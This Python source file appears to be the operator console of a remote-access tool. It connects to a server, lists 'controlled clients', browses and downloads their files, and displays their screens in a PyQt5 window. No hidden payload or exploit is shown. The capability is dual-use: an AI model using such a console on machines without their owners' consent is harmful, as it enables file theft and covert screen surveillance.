import base64
import json
import os
import random
import signal
import socket
import string
import sys
import threading
from typing import Dict, Any, Optional, List

from PyQt5.QtCore import Qt, QSize
from PyQt5.QtGui import QImage
from PyQt5.QtGui import QPixmap
from PyQt5.QtWidgets import QApplication
from PyQt5.QtWidgets import QWidget, QLabel, QVBoxLayout


class Control:
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.remote_control_list = []
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.lock = threading.Lock()  # 添加锁
        self.running = True  # 添加运行标志
        try:
            self.socket.connect((self.host, self.port))
            self.id: Optional[str] = None
            self.init_control()
            self.recv_thread = threading.Thread(target=self.receive_message, daemon=True)
            self.input_thread = threading.Thread(target=self.input_command, daemon=True)
            self.recv_thread.start()
            self.input_thread.start()
            while self.running:
                pass
            # 通过信号处理函数来优雅地退出程序
            signal.signal(signal.SIGINT, self._handle_exit)
            signal.signal(signal.SIGTERM, self._handle_exit)
        except socket.error as e:
            print(f"Connection error: {e}")
            sys.exit(1)

    def _handle_exit(self, signum, frame):
        self.close()

    def __del__(self) -> None:
        self.close()

    def _create_task_id(self) -> str:
        return 'id_' + ''.join(random.choices(string.ascii_letters + string.digits, k=10))

    def init_control(self) -> None:
        init_message = {"mode": "init", "client_mode": "control"}
        self.send_message(init_message)

    def send_message(self, message: Dict[str, Any]) -> None:
        try:
            print("send：", message)
            self.socket.send(json.dumps(message).encode('utf-8'))
        except (socket.error, json.JSONDecodeError) as e:
            print(f"Error sending message: {e}")
            self.close()

    def receive_message(self) -> None:
        buffer = ""
        while True:
            try:
                data = self.socket.recv(1048576).decode('utf-8')

                if not data:
                    break
                buffer += data
                while True:
                    try:
                        msg, idx = json.JSONDecoder().raw_decode(buffer)
                        print("receive_message：", msg)
                        self.handle_message(msg)
                        buffer = buffer[idx:].lstrip()
                    except ValueError:
                        break
            except (socket.error, UnicodeDecodeError) as e:
                print(f"Error receiving message: {e}")
                self.close()
                break

    def print_client_list(self, client_list: List[Dict[str, Any]]) -> None:
        print("\n{:<6} {:<15} {:<15} {:<10} {:<20}".format(
            "NUMBER", "ID", "IP", "PORT", "TIME"))
        for i, client in enumerate(client_list, 1):
            print("{:<6} {:<15} {:<15} {:<10} {:<20}".format(
                i, client['id'], client['ip'], client['port'], client['time']))

    def print_directory(self, data: Dict[str, Any]) -> None:
        print(f"\nClient {data['data']['client_id']} directory listing for {data['data']['root']}:")
        for file in data['data']['list']:
            print(f"  - {file}")

    def save_downloaded_file(self, data: Dict[str, Any]) -> None:
        try:
            output_path = data["data"]["output"]
            file_name = os.path.basename(data["data"]["file"])
            file_path = os.path.join(output_path, file_name)
            chunk = data["data"].get("chunk", False)

            with open(file_path, "ab+") as d:
                if chunk:
                    binary_data = bytes.fromhex(data["data"]["data"])
                    d.write(binary_data)
                else:
                    if hasattr(self, 'download_file') and self.download_file:
                        d.close()
                        print(f"\nFile downloaded successfully to: {file_path}\n")
        except IOError as e:
            print(f"\nError saving file: {e}\n")

    def get_remote_control(self, id):
        for r in self.remote_control_list:
            if r["id"] == id:
                return r

    def remote_control(self, data):
        try:
            remote_control_info = self.get_remote_control(data["remote_control_ui"])
            ui = remote_control_info["ui"]

            img_data = base64.b64decode(data["data"]["img"])
            qimage = QImage.fromData(img_data)
            pix = QPixmap.fromImage(qimage)

            if hasattr(self, 'remote_control_ui'):
                ui.update_img(pix)


        except Exception as e:
            print(f"Error processing remote image: {e}")

    def remote_control_ui_thearding(self, remote_control_info: Dict) -> None:
        app = QApplication(sys.argv)
        remote_control_ui = RemoteControlUI()
        remote_control_info["ui"] = remote_control_ui
        sys.exit(app.exec_())

    def init_remote_control(self, params: Dict) -> None:
        try:
            # 参数处理修正
            default_params = {
                "fps": 25,
                "definition": 720,
                "mouse": False,
                "recording": False,
                "output": None
            }

            # 更新默认参数
            for key in params:
                if key in default_params:
                    if key in ["fps", "definition"]:
                        default_params[key] = int(params[key])
                    elif key in ["mouse", "recording"]:
                        default_params[key] = params[key].lower() == "true"
                    else:
                        default_params[key] = params[key]

            # 确保client_id存在
            if "client_id" not in params:
                print("Error: client_id parameter is required")
                return
            remote_control_id = self._create_task_id()
            remote_control_info = {"id": remote_control_id, "ui_thearding": None, "ui": None}

            self.send_message({
                "mode": "init_remote_control",
                "remote_control_id": remote_control_id,
                "client_id": params["client_id"],
                "controll_client_id": self.id,
                "data": default_params
            })

            # 初始化UI
            if not hasattr(self, 'remote_control_ui'):
                ui_thearding = threading.Thread(target=self.remote_control_ui_thearding, args=(remote_control_info, ),daemon=True).start()
                remote_control_info["ui_thearding"] = ui_thearding
                self.remote_control_list.append(remote_control_info)

        except Exception as e:
            print(f"Error initializing remote control: {e}")

    def handle_message(self, data: Dict[str, Any]) -> None:
        try:
            if data["mode"] == "init":
                self.id = data["id"]
            elif data["mode"] == "client_list":
                self.print_client_list(data["data"])
            elif data["mode"] == "return":
                if data["data"]["mode"] == "dir":
                    self.print_directory(data)
                elif data["data"]["mode"] == "download":
                    self.save_downloaded_file(data)
                elif data["data"]["mode"] == "remote_control":
                    self.remote_control(data)

        except KeyError as e:
            print(f"Invalid message format: {e}")

    def client_list(self) -> None:
        self.send_message({"mode": "clients_list"})

    def directory(self, client_id: str, root: str) -> None:
        self.send_message({
            "mode": "directory",
            "param": {"client_id": client_id, "root": root}
        })

    def init_download(self, client_id: str, file_path: str, output_path: str) -> None:
        self.send_message({
            "mode": "init_download",
            "param": {
                "client_id": client_id,
                "file": file_path,
                "output": output_path
            }
        })

    def close(self) -> None:
        try:
            if hasattr(self, 'socket') and self.socket:
                self.send_message({"mode": "close"})
                self.socket.close()
        except Exception as e:
            print(f"Error closing control: {e}")
        finally:
            self.running = False
            if hasattr(self, 'recv_thread') and self.recv_thread.is_alive():
                self.recv_thread.join()
            if hasattr(self, 'input_thread') and self.input_thread.is_alive():
                self.input_thread.join()
            sys.exit()

    def input_command(self) -> None:
        help_text = """
        Available commands:
          /client_list                  - List all controlled clients
          /dir -client_id=ID -root=PATH - List directory contents
          /download -client_id=ID -file=SRC -output=DST - Download file
          /remote_control -client_id=ID -fps=FPS -definition=[360, 720, 1080, 2k, 4k] -mouse=BOOL -recording=BOOL -output=PATH  - Remotely control a client
          /exit                         - Exit the program
        """

        while self.running:
            try:
                input_txt = input("").strip()
                if not input_txt:
                    continue

                if input_txt.startswith("/"):
                    parts = input_txt.split()
                    command = parts[0]
                    params = self._parse_params(parts[1:])

                    if command == "/exit":
                        self.close()
                    elif command == "/client_list":
                        self.client_list()
                    elif command == "/dir":
                        self._handle_dir_command(params)
                    elif command == "/download":
                        self._handle_download_command(params)
                    elif command == "/remote_control":
                        self._handle_remote_control_command(params)
                    elif command == "/help":
                        print(help_text)
                    else:
                        print(f"Unknown command: {command}")
                else:
                    print("Commands must start with '/'. Type /help for available commands.")
            except (KeyboardInterrupt, EOFError):
                self.close()
            except Exception as e:
                print(f"Error processing command: {e}")

    def _parse_params(self, parts: List[str]) -> Dict[str, str]:
        params = {}
        for part in parts:
            if part.startswith("-") and "=" in part:
                key, value = part[1:].split("=", 1)
                params[key] = value
        return params

    def _handle_dir_command(self, params: Dict[str, str]) -> None:
        if "client_id" not in params or "root" not in params:
            print("Error: Both -client_id and -root parameters are required")
            return
        self.directory(params["client_id"], params["root"])

    def _handle_download_command(self, params: Dict[str, str]) -> None:
        required = ["client_id", "file"]
        if not all(p in params for p in required):
            print("Error: -client_id and -file parameters are required")
            return
        output = params.get("output", "")
        self.init_download(params["client_id"], params["file"], output)

    def _handle_remote_control_command(self, params: Dict) -> None:

        if "client_id" not in params:
            print("Error: Both -client_id parameters are required")
            return

        self.init_remote_control(params)


class RemoteControlUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Remote Control")
        self.setFixedSize(1280, 720)
        self.img_label = QLabel(self)
        self.img_label.setAlignment(Qt.AlignCenter)
        self.img_label.setFixedSize(1280, 720)

        layout = QVBoxLayout()
        layout.setContentsMargins(0, 0, 0, 0)
        layout.addWidget(self.img_label)
        self.setLayout(layout)

        self.original_pixmap_size = QSize()  # 保存原始图像尺寸
        self.show()

    def update_img(self, pixmap):
        self.original_pixmap_size = pixmap.size()  # 更新原始尺寸
        scaled_pixmap = pixmap.scaled(
            self.img_label.size(),
            Qt.KeepAspectRatio,
            Qt.SmoothTransformation
        )
        self.img_label.setPixmap(scaled_pixmap)
        self.img_label.setAlignment(Qt.AlignCenter)

if __name__ == "__main__":
    control = Control('192.168.1.120', 43234)
